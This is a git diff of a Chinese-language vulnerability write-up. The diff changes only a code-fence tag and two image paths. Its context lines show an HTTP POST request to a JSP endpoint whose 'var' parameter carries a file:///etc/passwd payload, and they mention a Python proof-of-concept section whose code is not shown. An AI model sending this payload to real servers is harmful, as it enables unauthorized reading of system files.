@@ -38,7 +38,7 @@ JSONObject.fromObject(request.getParameter("var"));
 
 请求包为
 
-```plain
+```
 POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
@@ -49,7 +49,7 @@ Accept-Encoding: gzip
 var={"body":{"file":"file:///etc/passwd"}}
 ```
 
-![](images/202202090128987.png)
+![](../.gitbook/assets/202202090128987.png)
 
 ## 漏洞POC
 
@@ -100,4 +100,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](images/202202090129010.png)
+![](../.gitbook/assets/202202090129010.png)
